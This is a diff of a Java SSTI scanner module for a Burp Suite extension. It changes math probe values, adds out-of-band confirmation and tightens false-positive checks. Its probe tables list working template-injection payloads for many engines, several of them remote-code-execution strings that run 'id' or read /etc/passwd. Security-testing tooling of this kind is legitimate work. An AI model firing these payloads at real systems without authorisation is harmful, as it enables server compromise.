@@ -7,10 +7,10 @@ import burp.api.montoya.http.message.requests.HttpRequest;
 import com.omnistrike.framework.CollaboratorManager;
 import com.omnistrike.framework.DeduplicationStore;
 import com.omnistrike.framework.FindingsStore;
+import com.omnistrike.framework.PayloadEncoder;
 
 import com.omnistrike.model.*;
 
-import java.net.URLEncoder;
 import java.nio.charset.StandardCharsets;
 import java.util.*;
 import java.util.concurrent.ConcurrentHashMap;
@@ -29,46 +29,43 @@ public class SstiScanner implements ScanModule {
     private DeduplicationStore dedup;
     private FindingsStore findingsStore;
     private CollaboratorManager collaboratorManager;
+    // Parameters confirmed exploitable via OOB — skip all remaining phases for these
+    private final Set<String> oobConfirmedParams = ConcurrentHashMap.newKeySet();
 
     private final ConcurrentHashMap<String, Boolean> tested = new ConcurrentHashMap<>();
 
     // Polyglot probe payloads and their expected results
+    // Use large unique numbers (e.g., 133*991=131803) to avoid matching natural page content.
+    // "49" from 7*7 matches page numbers, dates, etc. "131803" is extremely unlikely in normal HTML.
+    private static final String SSTI_EXPECTED = "131803";
     private static final String[][] POLYGLOT_PROBES = {
             // payload, expectedResult, description
-            {"{{7*7}}", "49", "Jinja2/Twig/Angular"},
-            {"${7*7}", "49", "Freemarker/Mako/EL"},
-            {"<%= 7*7 %>", "49", "ERB (Ruby)"},
-            {"#{7*7}", "49", "Pug/Jade/Thymeleaf"},
-            {"{7*7}", "49", "Smarty/Velocity"},
-            {"{{7*'7'}}", "7777777", "Jinja2 (string multiplication)"},
-            {"{{'7'*7}}", "7777777", "Twig (string repeat)"},
-            {"#set($x=7*7)${x}", "49", "Velocity"},
-            {"[[${7*7}]]", "49", "Thymeleaf inline"},
-            {"{{= 7*7}}", "49", "doT.js"},
-            {"<#assign x=7*7>${x}", "49", "Freemarker assign"},
+            {"{{133*991}}", SSTI_EXPECTED, "Jinja2/Twig/Angular"},
+            {"${133*991}", SSTI_EXPECTED, "Freemarker/Mako/EL"},
+            {"<%= 133*991 %>", SSTI_EXPECTED, "ERB (Ruby)"},
+            {"#{133*991}", SSTI_EXPECTED, "Pug/Jade/Thymeleaf"},
+            {"{133*991}", SSTI_EXPECTED, "Smarty/Velocity"},
+            {"{{133*'991'}}", "", "Jinja2 (string multiplication)"},  // String repeat produces huge output, not reliable
+            {"{{'133'*991}}", "", "Twig (string repeat)"},
+            {"#set($x=133*991)${x}", SSTI_EXPECTED, "Velocity"},
+            {"[[${133*991}]]", SSTI_EXPECTED, "Thymeleaf inline"},
+            {"{{= 133*991}}", SSTI_EXPECTED, "doT.js"},
+            {"<#assign x=133*991>${x}", SSTI_EXPECTED, "Freemarker assign"},
             {"${T(java.lang.Math).random()}", "", "Spring EL (any numeric output)"},
-            {"{if 7*7==49}49{/if}", "49", "Smarty (if conditional)"},
-            {"@(7*7)", "49", "Razor (.NET)"},
+            {"{if 133*991==131803}131803{/if}", SSTI_EXPECTED, "Smarty (if conditional)"},
+            {"@(133*991)", SSTI_EXPECTED, "Razor (.NET)"},
             {"{% debug %}", "settings|TEMPLATES|INSTALLED_APPS", "Django debug tag"},
-            {"{{'7'*7}}", "7777777", "String multiplication (Jinja2/Twig)"},
             {"<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"id\")}", "uid=", "Freemarker assign RCE"},
-            {"${{7*7}}", "49", "Combined Jinja2/Freemarker"},
-            {"{{7*'7'}}", "7777777", "Jinja2 string repeat (alt)"},
-            {"<%= system('echo 49') %>", "49", "ERB system echo"},
-            {"{{constructor.constructor('return 7*7')()}}", "49", "Prototype pollution eval"},
-            {"{{range.constructor('return 7*7')()}}", "49", "Nunjucks/Handlebars range constructor"},
-            {"{php}echo 7*7;{/php}", "49", "Smarty PHP block (legacy)"},
-            {"${7*7}", "49", "EL/Freemarker/Mako (alt)"},
-            {"#{7*7}", "49", "Pug/Jade/Ruby interpolation"},
-            {"${= 7*7}", "49", "doT.js (alt syntax)"},
-            {"{%set x=7*7%}{{x}}", "49", "Jinja2 set tag"},
-            {"{{7*7}}", "49", "Mustache/Handlebars (if evaluated)"},
-            {"${7+7+7+7+7+7+7}", "49", "Spring EL addition chain"},
-            {"<%= 7.*(7) %>", "49", "ERB method call"},
-            {"{{\"7\"*7}}", "7777777", "Twig/Jinja2 string multiply"},
-            {"p #{7*7}", "49", "Slim template (Ruby)"},
-            {"{{ 7 * 7 }}", "49", "Liquid template eval"},
-            {"@(7 * 7)", "49", "Razor (with spaces)"},
+            {"${{133*991}}", SSTI_EXPECTED, "Combined Jinja2/Freemarker"},
+            {"{{constructor.constructor('return 133*991')()}}", SSTI_EXPECTED, "Prototype pollution eval"},
+            {"{{range.constructor('return 133*991')()}}", SSTI_EXPECTED, "Nunjucks/Handlebars range constructor"},
+            {"{php}echo 133*991;{/php}", SSTI_EXPECTED, "Smarty PHP block (legacy)"},
+            {"{%set x=133*991%}{{x}}", SSTI_EXPECTED, "Jinja2 set tag"},
+            {"${131000+803}", SSTI_EXPECTED, "Spring EL addition"},
+            {"<%= 133.*(991) %>", SSTI_EXPECTED, "ERB method call"},
+            {"p #{133*991}", SSTI_EXPECTED, "Slim template (Ruby)"},
+            {"{{ 133 | times: 991 }}", SSTI_EXPECTED, "Liquid template eval"},
+            {"@(133 * 991)", SSTI_EXPECTED, "Razor (with spaces)"},
     };
 
     // Universal polyglot that triggers errors in most engines
@@ -86,70 +83,67 @@ public class SstiScanner implements ScanModule {
                 {"{{lipsum.__globals__}}", "os|builtins", "Jinja2 lipsum globals"},
                 {"{{cycler.__init__.__globals__.os.popen('id').read()}}", "uid=", "Jinja2 RCE via cycler (AGGRESSIVE)"},
                 {"{{()|attr('\\x5f\\x5fclass\\x5f\\x5f')|attr('\\x5f\\x5fbase\\x5f\\x5f')|attr('\\x5f\\x5fsubclasses\\x5f\\x5f')()}}", "subprocess|Popen|Warning", "Jinja2 attr+hex filter bypass"},
-                {"{{request.args.cmd}}", "", "Jinja2 request.args bypass (any non-empty output)"},
                 {"{{().__class__.__mro__[1].__subclasses__()}}", "subprocess|Popen|Warning", "Jinja2 MRO via hex escape"},
         });
         ENGINE_PROBES.put("Twig", new String[][]{
                 {"{{_self.env.getFilter('id')}}", "Twig", "Twig self reference"},
-                {"{{'test'|upper}}", "TEST", "Twig filter"},
-                {"{{'7'*7}}", "7777777", "Twig string repeat"},
+                {"{{'omnistrike_ssti_confirm'|upper}}", "OMNISTRIKE_SSTI_CONFIRM", "Twig filter"},
+                {"{{'133'*7}}", "133133133133133133133", "Twig string repeat"},
                 {"{{_self.env.getRuntimeLoader()}}", "Twig|Runtime", "Twig runtime loader"},
                 {"{{dump(app)}}", "AppVariable|kernel", "Symfony app dump"},
                 {"{{['id']|filter('system')}}", "uid=", "Twig RCE (AGGRESSIVE)"},
                 {"{{['id']|filter('passthru')}}", "uid=", "Twig passthru filter (AGGRESSIVE)"},
-                {"{{'test'|reduce((a,b)=>a~b)}}", "test", "Twig reduce filter"},
+                {"{{'omnistrike'|reduce((a,b)=>a~b)}}", "omnistrike", "Twig reduce filter"},
         });
         ENGINE_PROBES.put("Freemarker", new String[][]{
                 {"${.version}", "2.", "Freemarker version"},
-                {"${.now}", "20", "Freemarker date (year prefix)"},
+                {"${133*991}", SSTI_EXPECTED, "Freemarker eval"},
                 {"${\"freemarker.template.utility.ObjectConstructor\"?new()}", "ObjectConstructor", "Freemarker OC"},
                 {"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}", "uid=", "Freemarker RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Velocity", new String[][]{
-                {"#set($x=7*7)$x", "49", "Velocity set"},
+                {"#set($x=133*991)$x", SSTI_EXPECTED, "Velocity set"},
                 {"$class.inspect('java.lang.Runtime')", "Runtime", "Velocity reflection"},
                 {"#set($rt=$class.inspect('java.lang.Runtime').type.getRuntime())$rt.exec('id')", "Process", "Velocity RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Thymeleaf", new String[][]{
-                {"__${7*7}__", "49", "Thymeleaf preprocessor"},
+                {"__${133*991}__", SSTI_EXPECTED, "Thymeleaf preprocessor"},
                 {"__${T(java.lang.Runtime).getRuntime().exec('id')}__", "Process", "Thymeleaf RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Mako", new String[][]{
-                {"${7*7}", "49", "Mako eval"},
+                {"${133*991}", SSTI_EXPECTED, "Mako eval"},
                 {"${self.module.__builtins__}", "builtins", "Mako builtins access"},
                 {"<%import os%>${os.popen('id').read()}", "uid=", "Mako RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("ERB", new String[][]{
-                {"<%= 7*7 %>", "49", "ERB eval"},
+                {"<%= 133*991 %>", SSTI_EXPECTED, "ERB eval"},
                 {"<%= Dir.entries('/') %>", "[", "ERB dir listing"},
                 {"<%= system('id') %>", "uid=", "ERB RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Pug", new String[][]{
-                {"#{7*7}", "49", "Pug eval"},
+                {"#{133*991}", SSTI_EXPECTED, "Pug eval"},
                 {"#{root.process.mainModule.require('child_process').execSync('id')}", "uid=", "Pug RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Handlebars", new String[][]{
-                {"{{#with \"s\" as |string|}}{{#with \"e\"}}{{this}}{{/with}}{{/with}}", "e", "Handlebars with block"},
                 {"{{#each (lookup this \"constructor\")}}{{this}}{{/each}}", "function", "Handlebars constructor lookup"},
-                {"{{this}}", "", "Handlebars this context (any non-empty output)"},
-                {"{{#if true}}hbs_confirmed{{/if}}", "hbs_confirmed", "Handlebars if helper"},
+                {"{{#if true}}omnistrike_hbs_confirmed{{/if}}", "omnistrike_hbs_confirmed", "Handlebars if helper"},
                 {"{{#with (lookup this \"constructor\")}}{{#with (lookup this \"constructor\")}}{{this (\"return this.process.mainModule.require('child_process').execSync('id')\")}}{{/with}}{{/with}}", "uid=", "Handlebars RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Smarty", new String[][]{
-                {"{math equation=\"7*7\"}", "49", "Smarty math"},
+                {"{math equation=\"133*991\"}", SSTI_EXPECTED, "Smarty math"},
                 {"{$smarty.version}", "3.|4.|5.", "Smarty version leak"},
-                {"{if 7*7==49}49{/if}", "49", "Smarty if conditional"},
-                {"{php}echo 7*7;{/php}", "49", "Smarty PHP tags (deprecated in v3+)"},
+                {"{if 133*991==131803}131803{/if}", SSTI_EXPECTED, "Smarty if conditional"},
+                {"{php}echo 133*991;{/php}", SSTI_EXPECTED, "Smarty PHP tags (deprecated in v3+)"},
                 {"{if phpinfo()}{/if}", "PHP Version", "Smarty phpinfo (AGGRESSIVE)"},
                 {"{system('id')}", "uid=", "Smarty RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("doT.js", new String[][]{
-                {"{{= 7*7}}", "49", "doT.js eval"},
+                {"{{= 133*991}}", SSTI_EXPECTED, "doT.js eval"},
                 {"{{= global.process.mainModule.require('child_process').execSync('id') }}", "uid=", "doT.js RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Nunjucks", new String[][]{
-                {"{{7*7}}", "49", "Nunjucks eval"},
-                {"{{range.constructor(\"return 7*7\")()}}", "49", "Nunjucks constructor eval"},
+                {"{{133*991}}", SSTI_EXPECTED, "Nunjucks eval"},
+                {"{{range.constructor(\"return 133*991\")()}}", SSTI_EXPECTED, "Nunjucks constructor eval"},
                 {"{{range.constructor(\"return this.process.mainModule.require('child_process').execSync('id')\")()}}", "uid=", "Nunjucks RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Django", new String[][]{
@@ -159,35 +153,35 @@ public class SstiScanner implements ScanModule {
                 {"{% include 'admin/base.html' %}", "Django|admin|doctype", "Django template include"},
         });
         ENGINE_PROBES.put("Razor", new String[][]{
-                {"@(7*7)", "49", "Razor eval"},
+                {"@(133*991)", SSTI_EXPECTED, "Razor eval"},
                 {"@DateTime.Now", "20", "Razor DateTime (year prefix)"},
                 {"@System.IO.Directory.GetCurrentDirectory()", "/|C:\\", "Razor directory listing"},
                 {"@System.Diagnostics.Process.Start(\"id\")", "Process", "Razor RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("EJS", new String[][]{
-                {"<%= 7*7 %>", "49", "EJS eval"},
+                {"<%= 133*991 %>", SSTI_EXPECTED, "EJS eval"},
                 {"<%= process.mainModule.require('child_process').execSync('id') %>", "uid=", "EJS RCE (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Mustache", new String[][]{
                 {"{{#list}}test{{/list}}", "test|list", "Mustache section"},
         });
         ENGINE_PROBES.put("Liquid", new String[][]{
-                {"{{ 7 | times: 7 }}", "49", "Liquid filter"},
-                {"{{ 'test' | upcase }}", "TEST", "Liquid upcase filter"},
-                {"{% assign x = 7 %}{{ x | times: 7 }}", "49", "Liquid assign + filter"},
+                {"{{ 133 | times: 991 }}", SSTI_EXPECTED, "Liquid filter"},
+                {"{{ 'omnistrike' | upcase }}", "OMNISTRIKE", "Liquid upcase filter"},
+                {"{% assign x = 133 %}{{ x | times: 991 }}", SSTI_EXPECTED, "Liquid assign + filter"},
         });
         ENGINE_PROBES.put("Blade", new String[][]{
-                {"{{ 7*7 }}", "49", "Laravel Blade double curly"},
-                {"{!! 7*7 !!}", "49", "Blade unescaped output"},
-                {"@php echo 7*7; @endphp", "49", "Blade PHP block (AGGRESSIVE)"},
+                {"{{ 133*991 }}", SSTI_EXPECTED, "Laravel Blade double curly"},
+                {"{!! 133*991 !!}", SSTI_EXPECTED, "Blade unescaped output"},
+                {"@php echo 133*991; @endphp", SSTI_EXPECTED, "Blade PHP block (AGGRESSIVE)"},
         });
         ENGINE_PROBES.put("Plates", new String[][]{
-                {"<?= 7*7 ?>", "49", "Plates short echo"},
-                {"<?= $this->e('test') ?>", "test", "Plates escape helper"},
+                {"<?= 133*991 ?>", SSTI_EXPECTED, "Plates short echo"},
+                {"<?= $this->e('omnistrike_confirm') ?>", "omnistrike_confirm", "Plates escape helper"},
         });
         ENGINE_PROBES.put("Groovy", new String[][]{
-                {"${7*7}", "49", "Groovy GString"},
-                {"<% println 7*7 %>", "49", "Groovy template"},
+                {"${133*991}", SSTI_EXPECTED, "Groovy GString"},
+                {"<% println 133*991 %>", SSTI_EXPECTED, "Groovy template"},
                 {"${\"cat /etc/passwd\".execute().text}", "root:", "Groovy RCE (AGGRESSIVE)"},
         });
     }
@@ -301,11 +295,25 @@ public class SstiScanner implements ScanModule {
     }
 
     @Override
+    public List<Finding> processHttpFlowForParameter(
+            HttpRequestResponse requestResponse, String targetParameterName, MontoyaApi api) {
+        HttpRequest request = requestResponse.request();
+        String urlPath = extractPath(request.url());
+        List<InjectionTarget> targets = extractTargets(request);
+        targets.removeIf(t -> !t.name.equalsIgnoreCase(targetParameterName));
+        return runSstiTargets(requestResponse, targets, urlPath);
+    }
+
+    @Override
     public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
         HttpRequest request = requestResponse.request();
         String urlPath = extractPath(request.url());
         List<InjectionTarget> targets = extractTargets(request);
+        return runSstiTargets(requestResponse, targets, urlPath);
+    }
 
+    private List<Finding> runSstiTargets(HttpRequestResponse requestResponse,
+                                          List<InjectionTarget> targets, String urlPath) {
         for (InjectionTarget target : targets) {
             if (!dedup.markIfNew("ssti-scanner", urlPath, target.name)) continue;
 
@@ -323,13 +331,20 @@ public class SstiScanner implements ScanModule {
         String url = original.request().url();
         boolean aggressiveMode = config.getBool("ssti.aggressive", false);
 
-        // Get baseline response
+        // Step 1: OOB via Collaborator (FIRST — fastest path to confirmed finding)
+        // Send all engine OOB payloads unconditionally (engine=null → sends all)
+        if (collaboratorManager != null && collaboratorManager.isAvailable()) {
+            testOobSsti(original, target, null);
+        }
 
+        // Get baseline response
+        if (oobConfirmedParams.contains(target.name)) return;
         HttpRequestResponse baseline = sendPayload(original, target, target.originalValue);
         if (baseline == null || baseline.response() == null) return;
         String baselineBody = baseline.response().bodyToString();
+        if (baselineBody == null) baselineBody = "";
 
-        // Step 1: Error-triggering polyglot
+        // Step 2: Error-triggering polyglot
         boolean polyglotCaused500 = false;
 
         HttpRequestResponse errorResult = sendPayload(original, target, POLYGLOT_ERROR);
@@ -347,25 +362,22 @@ public class SstiScanner implements ScanModule {
                             .evidence("Engine: " + entry.getKey() + " | Polyglot triggered error response (status " + errorStatus + ")")
                             .description("Template engine error detected. Input may reach a " + entry.getKey() + " template.")
                             .requestResponse(errorResult)
+                            .payload(POLYGLOT_ERROR)
                             .build());
                 }
             }
 
-            // Generic 500 error from polyglot is also suspicious
+            // A 500 from the polyglot is NOT reported as a finding — malformed input in cookies,
+            // query params, or headers commonly triggers 500s for reasons unrelated to template rendering
+            // (input validation, WAF rejection, deserialization errors, etc.). However, we still use it
+            // to gate OOB testing below, since OOB only confirms if Collaborator actually gets a callback.
             if (errorStatus == 500 && baseline.response().statusCode() != 500) {
                 polyglotCaused500 = true;
-                findingsStore.addFinding(Finding.builder("ssti-scanner",
-                                "SSTI Indicator: Server error from polyglot",
-                                Severity.LOW, Confidence.TENTATIVE)
-                        .url(url).parameter(target.name)
-                        .evidence("Polyglot probe caused 500 error (baseline was " + baseline.response().statusCode() + ")")
-                        .description("The SSTI polyglot probe triggered a server error, suggesting input reaches template rendering.")
-                        .requestResponse(errorResult)
-                        .build());
             }
         }
 
-        // Step 2: Math evaluation probes
+        // Step 3: Math evaluation probes
+        if (oobConfirmedParams.contains(target.name)) return;
         boolean templateConfirmed = false;
         String confirmedEngine = null;
 
@@ -377,6 +389,10 @@ public class SstiScanner implements ScanModule {
     
             HttpRequestResponse result = sendPayload(original, target, payload);
             if (result == null || result.response() == null) continue;
+
+            // Skip error responses — template evaluation should produce a 200, not a 4xx/5xx
+            int responseStatus = result.response().statusCode();
+            if (responseStatus >= 400) continue;
 
             String responseBody = result.response().bodyToString();
 
@@ -393,6 +409,7 @@ public class SstiScanner implements ScanModule {
                             .evidence("Payload: " + payload + " | Random number appeared in response")
                             .description("Spring EL injection confirmed via Math.random() execution.")
                             .requestResponse(result)
+                            .payload(payload)
                             .build());
                     break;
                 }
@@ -401,32 +418,53 @@ public class SstiScanner implements ScanModule {
 
             // Check if expected result appears in response but NOT in baseline
             // Support OR matching: "A|B|C" means any of A, B, C must be found
+            // Guard: if baseline is empty, skip math-result checks (e.g., "49") to avoid FPs
             boolean expectedFound = false;
             if (!expected.isEmpty()) {
+                boolean baselineEmpty = baselineBody.isEmpty();
                 if (expected.contains("|")) {
                     for (String exp : expected.split("\\|")) {
-                        if (responseBody.contains(exp.trim()) && !baselineBody.contains(exp.trim())) {
+                        String trimmed = exp.trim();
+                        if (baselineEmpty && trimmed.matches("\\d+")) continue; // Skip numeric matches on empty baseline
+                        if (responseBody.contains(trimmed) && !baselineBody.contains(trimmed)) {
                             expectedFound = true;
                             break;
                         }
                     }
                 } else {
-                    expectedFound = responseBody.contains(expected) && !baselineBody.contains(expected);
+                    if (baselineEmpty && expected.matches("\\d+")) {
+                        // Don't trust numeric matches (like "49") when baseline is empty
+                        expectedFound = false;
+                    } else {
+                        expectedFound = responseBody.contains(expected) && !baselineBody.contains(expected);
+                    }
                 }
             }
             if (expectedFound) {
-                templateConfirmed = true;
+                // Verify template syntax was consumed — if the raw payload appears verbatim
+                // in the response, the server is just reflecting input, not evaluating it.
+                // The expected value may coincidentally exist elsewhere on the page.
+                boolean syntaxConsumed = !responseBody.contains(payload);
+                if (!syntaxConsumed) continue;  // Raw payload reflected = not evaluated
 
-                Severity severity = Severity.HIGH;
-                Confidence confidence = Confidence.FIRM;
+                // Additional check: the expected value must not be a substring of the payload
+                // (e.g., if payload is "{{131803}}" and expected is "131803", the server might
+                // just be stripping the braces). Verify result appears in a different context.
+                // Skip if expected appears ONLY adjacent to remnants of the payload syntax.
+
+                templateConfirmed = true;
 
                 findingsStore.addFinding(Finding.builder("ssti-scanner",
                                 "SSTI Detected: " + engineHint + " template evaluation",
-                                severity, confidence)
+                                Severity.HIGH, Confidence.FIRM)
                         .url(url).parameter(target.name)
-                        .evidence("Payload: " + payload + " | Expected: " + expected + " found in response")
-                        .description("Template expression was evaluated. Engine hint: " + engineHint)
+                        .evidence("Payload: " + payload + " | Expected: " + expected
+                                + " found in response (template syntax consumed)")
+                        .description("Template expression was evaluated — the template syntax was consumed "
+                                + "and replaced with the computed result. Engine hint: " + engineHint)
                         .requestResponse(result)
+                        .payload(payload)
+                        .responseEvidence(expected)
                         .build());
                 break;
             }
@@ -434,15 +472,16 @@ public class SstiScanner implements ScanModule {
             perHostDelay();
         }
 
-        // Step 3: Engine identification (if template evaluation confirmed)
+        // Step 4: Engine identification (if template evaluation confirmed)
+        if (oobConfirmedParams.contains(target.name)) return;
         String identifiedEngine = null;
         if (templateConfirmed) {
             identifiedEngine = identifyEngine(original, target, baselineBody, aggressiveMode);
         }
 
-        // Step 4: OOB SSTI via Collaborator (only if template evaluation confirmed or polyglot caused 500)
-        if ((templateConfirmed || polyglotCaused500)
-                && collaboratorManager != null && collaboratorManager.isAvailable()) {
+        // Step 5: Targeted OOB for identified engine (refines the initial blanket OOB from Step 1)
+        if (oobConfirmedParams.contains(target.name)) return;
+        if (identifiedEngine != null && collaboratorManager != null && collaboratorManager.isAvailable()) {
             testOobSsti(original, target, identifiedEngine);
         }
     }
@@ -485,6 +524,14 @@ public class SstiScanner implements ScanModule {
                     }
 
                     if (matched) {
+                        // Verify template syntax was consumed (not just reflected)
+                        // Skip this check for RCE payloads (they confirm via command output, not math)
+                        if (!desc.contains("RCE") && !desc.contains("version") && !desc.contains("config")
+                                && !desc.contains("class") && !desc.contains("globals")
+                                && body.contains(payload)) {
+                            continue;  // Raw payload reflected = not evaluated
+                        }
+
                         Severity severity = desc.contains("RCE") ? Severity.CRITICAL : Severity.HIGH;
                         Confidence confidence = Confidence.CERTAIN;
 
@@ -496,6 +543,8 @@ public class SstiScanner implements ScanModule {
                                 .description("Template engine positively identified as " + engine
                                         + ". " + desc + ".")
                                 .requestResponse(result)
+                                .payload(payload)
+                                .responseEvidence(expected)
                                 .build());
                         return engine; // Engine identified, done
                     }
@@ -516,9 +565,22 @@ public class SstiScanner implements ScanModule {
             String payloadTemplate = payloadInfo[0];
             String technique = payloadInfo[1];
 
-            // If engine was identified, only send OOB payloads for that engine
-            if (identifiedEngine != null && !technique.toLowerCase().contains(identifiedEngine.toLowerCase())) {
-                continue;
+            // If engine was identified, only send OOB payloads for that engine and related engines
+            if (identifiedEngine != null) {
+                String techLower = technique.toLowerCase();
+                String engineLower = identifiedEngine.toLowerCase();
+                // Use word-boundary match to avoid substring false positives
+                // (e.g., engine "EL" matching "mod*el*" in an unrelated technique)
+                boolean match = techLower.matches(".*\\b" + Pattern.quote(engineLower) + "\\b.*");
+                // Thymeleaf uses Spring EL, so include Spring EL payloads when Thymeleaf is detected
+                if (!match && engineLower.contains("thymeleaf")) {
+                    match = techLower.contains("spring el");
+                }
+                // Spring EL apps often use Thymeleaf as the view layer
+                if (!match && engineLower.contains("spring")) {
+                    match = techLower.contains("thymeleaf");
+                }
+                if (!match) continue;
             }
 
             // AtomicReference to capture the sent request/response for the finding
@@ -528,6 +590,14 @@ public class SstiScanner implements ScanModule {
                     "ssti-scanner", url, target.name,
                     "SSTI OOB " + technique,
                     interaction -> {
+                        // Brief spin-wait to let the sending thread complete set() — the Collaborator poller
+                        // fires on a 5-second interval so this race is rare, but when it happens the 50ms
+                        // wait is almost always enough for the sending thread to complete its set() call.
+                        for (int _w = 0; _w < 10 && sentRequest.get() == null; _w++) {
+                            try { Thread.sleep(5); } catch (InterruptedException ignored) { break; }
+                        }
+                        // Mark parameter as confirmed — skip all remaining phases
+                        oobConfirmedParams.add(target.name);
                         findingsStore.addFinding(Finding.builder("ssti-scanner",
                                         "SSTI Confirmed (Out-of-Band) - " + technique,
                                         Severity.CRITICAL, Confidence.CERTAIN)
@@ -538,7 +608,8 @@ public class SstiScanner implements ScanModule {
                                 .description("Server-Side Template Injection confirmed via Burp Collaborator. "
                                         + "The template engine executed the injected command, triggering a "
                                         + interaction.type().name() + " callback.")
-                                .requestResponse(sentRequest.get())
+                                .requestResponse(sentRequest.get())  // may be null if callback fires before set() — finding is still reported
+                                .payload(payloadTemplate)
                                 .build());
                         api.logging().logToOutput("[SSTI OOB] Confirmed! " + technique
                                 + " at " + url + " param=" + target.name);
@@ -571,21 +642,18 @@ public class SstiScanner implements ScanModule {
         switch (target.type) {
             case QUERY:
                 return request.withUpdatedParameters(
-                        HttpParameter.urlParameter(target.name,
-                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
+                        HttpParameter.urlParameter(target.name, PayloadEncoder.encode(payload)));
             case BODY:
                 return request.withUpdatedParameters(
-                        HttpParameter.bodyParameter(target.name,
-                                URLEncoder.encode(payload, StandardCharsets.UTF_8)));
+                        HttpParameter.bodyParameter(target.name, PayloadEncoder.encode(payload)));
             case COOKIE:
-                return request.withUpdatedParameters(
-                        HttpParameter.cookieParameter(target.name, payload));
+                return PayloadEncoder.injectCookie(request, target.name, payload);
             case JSON:
                 String body = request.bodyToString();
                 String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
                 if (target.name.contains(".")) {
-                    // Nested key — parse, replace, serialize
-                    String newBody = replaceNestedJsonValue(body, target.name, escaped);
+                    // Nested key — parse, replace, serialize (pass raw payload; Gson escapes internally)
+                    String newBody = replaceNestedJsonValue(body, target.name, payload);
                     return request.withBody(newBody);
                 } else {
                     String jsonPattern = "\"" + java.util.regex.Pattern.quote(target.name) + "\"\\s*:\\s*(?:\"[^\"]*\"|\\d+(?:\\.\\d+)?|true|false|null)";
